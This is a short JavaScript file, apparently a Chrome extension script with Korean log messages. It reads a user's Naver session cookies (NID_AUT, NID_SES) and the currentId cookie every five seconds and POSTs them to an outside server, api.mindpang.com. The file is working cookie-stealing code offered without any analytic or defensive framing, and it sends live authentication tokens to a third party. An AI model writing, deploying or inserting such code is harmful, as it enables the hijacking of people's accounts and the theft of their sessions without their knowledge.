const setNaverCookie = async (CURRENT_ID, NID_AUT, NID_SES) => {
  try {
    const data = {
      CURRENT_ID,
      NID_AUT,
      NID_SES,
    };

    await fetch("https://api.mindpang.com/api/naver/add.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });
    console.log("ok");
  } catch (e) {
    console.log("실패: ", e);
  }
};

const run = async () => {
  setInterval(async () => {
    const NID_AUT = await chrome.cookies.get({
      url: "https://naver.com",
      name: "NID_AUT",
    });
    const NID_SES = await chrome.cookies.get({
      url: "https://naver.com",
      name: "NID_SES",
    });
    const CurrentId = await chrome.cookies.get({
      url: "https://kin.naver.com",
      name: "currentId",
    });
    await setNaverCookie(CurrentId.value, NID_AUT.value, NID_SES.value);
  }, 5000);
};

// 예제 사용

run();
